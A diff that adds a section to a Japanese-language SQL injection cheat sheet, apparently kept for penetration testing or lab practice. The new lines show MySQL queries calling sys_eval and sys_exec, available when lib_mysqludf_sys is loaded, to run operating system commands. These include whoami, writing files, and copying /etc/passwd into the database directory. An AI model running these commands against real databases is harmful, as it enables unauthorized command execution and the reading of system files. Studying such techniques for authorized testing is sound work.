@@ -235,6 +235,17 @@ https://github.com/payloadbox/sql-injection-payload-list/raw/refs/heads/master/I
 
 intruder 等で使って弱点を探る。
 
+## コマンド
+
+MySQL で、lib_mysqludf_sys.so がロードされている場合に限る。
+
+```sql
+SELECT sys_eval('whoami');
+SELECT sys_exec ('touch /var/lib/mysql/test.txt');
+SELECT sys_exec ('echo "hello" > /var/lib/mysql/test.txt');
+SELECT sys_exec ('cat /etc/passwd > /var/lib/mysql/test2.txt');
+```
+
 ## sqlmap
 
 email パラメータに SQLi 脆弱性がある場合
